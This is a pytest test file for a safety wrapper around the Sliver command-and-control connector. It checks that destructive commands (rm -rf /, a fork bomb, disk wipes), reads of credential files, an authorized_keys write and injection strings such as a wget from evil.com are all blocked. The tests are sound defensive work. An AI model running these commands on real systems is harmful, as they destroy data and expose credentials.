"""Tests for SafeSliverConnector."""

import asyncio
import re
from pathlib import Path
from unittest.mock import patch

import pytest

from wish_c2.exceptions import SecurityError
from wish_c2.models import CommandResult
from wish_c2.sliver.safety import SafeSliverConnector


@pytest.fixture
def safety_config():
    """Default safety configuration."""
    return {
        "sandbox_mode": True,
        "read_only": False,
        "allowed_commands": ["ls", "pwd", "whoami"],
        "blocked_paths": ["/etc/shadow"],
        "max_file_size": 1024 * 1024,  # 1MB
    }


@pytest.fixture
def mock_config_path():
    """Mock config path."""
    return Path("/fake/config.cfg")


class TestSafeSliverConnector:
    """Test SafeSliverConnector security features."""

    def test_dangerous_command_patterns(self, mock_config_path, safety_config):
        """Test dangerous command pattern detection."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            ":(){ :|:& };",  # Fork bomb (simplified pattern)
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "> /dev/sda",
            "format C:",
            "del /f /s /q C:\\*",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                connector._validate_command_safety(cmd)

    def test_blocked_paths(self, mock_config_path, safety_config):
        """Test blocked path detection."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        blocked_commands = [
            "cat /etc/shadow",
            "vim /etc/passwd",
            "echo test > /root/.ssh/authorized_keys",
        ]

        for cmd in blocked_commands:
            with pytest.raises(SecurityError, match="blocked path"):
                connector._validate_command_safety(cmd)

    def test_command_injection_detection(self, mock_config_path, safety_config):
        """Test command injection detection."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        # These commands should be caught either by dangerous pattern or command injection
        injection_commands = [
            ("echo test; rm -rf /", "dangerous|injection"),
            ("ls && cat /etc/passwd", "blocked path|injection"),
            ("ping google.com || wget evil.com/script.sh", "injection"),
            ("echo `cat /etc/passwd`", "blocked path|injection"),
            ("echo $(whoami)", "injection"),
        ]

        for cmd, expected_pattern in injection_commands:
            with pytest.raises(SecurityError) as exc_info:
                connector._validate_command_safety(cmd)
            # Check if error message matches expected pattern
            assert re.search(expected_pattern, str(exc_info.value), re.IGNORECASE)

    def test_safe_patterns_allowed(self, mock_config_path, safety_config):
        """Test that safe patterns are allowed."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        safe_commands = [
            "ps aux | grep python",
            "netstat -tlnp | grep 8080",
            "ls -la | grep log",
            "cat file.txt | grep error",
            "echo $HOME",
            "echo $PATH",
        ]

        for cmd in safe_commands:
            # Should not raise
            connector._validate_command_safety(cmd)

    def test_write_command_detection(self, mock_config_path, safety_config):
        """Test write command detection."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        write_commands = [
            "rm file.txt",
            "mkdir newdir",
            "touch newfile",
            "echo test > file.txt",
            "cat test >> file.txt",
            "chmod 755 script.sh",
            "mv old.txt new.txt",
        ]

        for cmd in write_commands:
            assert connector._is_write_command(cmd) is True

        read_commands = [
            "ls",
            "cat file.txt",
            "grep pattern file.txt",
            "ps aux",
            "netstat -tlnp",
        ]

        for cmd in read_commands:
            assert connector._is_write_command(cmd) is False

    def test_read_only_mode(self, mock_config_path, safety_config):
        """Test read-only mode enforcement."""
        safety_config["read_only"] = True
        connector = SafeSliverConnector(mock_config_path, safety_config)

        # Test that write commands are detected
        assert connector._is_write_command("touch file.txt") is True

        # Test that execute_command raises error for write commands in read-only mode
        with patch("wish_c2.sliver.connector.RealSliverConnector.execute_command"):
            with pytest.raises(SecurityError, match="read-only mode"):
                asyncio.run(connector.execute_command("session-1", "touch file.txt"))

    def test_allowed_commands_whitelist(self, mock_config_path, safety_config):
        """Test allowed commands whitelist."""
        connector = SafeSliverConnector(mock_config_path, safety_config)

        # These should fail (not in whitelist)
        with patch.object(connector, "_validate_command_safety"):
            with patch.object(connector, "_is_write_command", return_value=False):
                # Mock parent's execute_command
                with patch("wish_c2.sliver.connector.RealSliverConnector.execute_command") as mock_exec:
                    mock_exec.return_value = CommandResult(stdout="", stderr="", exit_code=1)

                    # Should check whitelist
                    assert "cat" not in connector.allowed_commands

    @patch("wish_c2.sliver.connector.RealSliverConnector.execute_command")
    async def test_execute_command_with_safety(self, mock_parent_exec, mock_config_path, safety_config):
        """Test execute_command applies safety checks."""
        connector = SafeSliverConnector(mock_config_path, safety_config)
        mock_parent_exec.return_value = CommandResult(stdout="allowed", stderr="", exit_code=0)

        # Test allowed command
        result = await connector.execute_command("session-1", "ls")
        assert result.stdout == "allowed"

        # Test blocked command
        with pytest.raises(SecurityError):
            await connector.execute_command("session-1", "rm -rf /")

        # Test command not in whitelist
        with pytest.raises(SecurityError, match="not in allowed list"):
            await connector.execute_command("session-1", "cat /etc/hosts")

    def test_sandbox_mode_disabled(self, mock_config_path, safety_config):
        """Test behavior when sandbox mode is disabled."""
        safety_config["sandbox_mode"] = False
        connector = SafeSliverConnector(mock_config_path, safety_config)

        # Dangerous commands should pass validation (but still check whitelist)
        connector._validate_command_safety("rm -rf /")  # Should not raise

    def test_default_blocked_paths(self, mock_config_path):
        """Test default blocked paths are included."""
        connector = SafeSliverConnector(mock_config_path, {})

        # Check default paths are blocked
        assert "/etc/shadow" in connector.blocked_paths
        assert "/etc/passwd" in connector.blocked_paths
        assert "/root/.ssh" in connector.blocked_paths
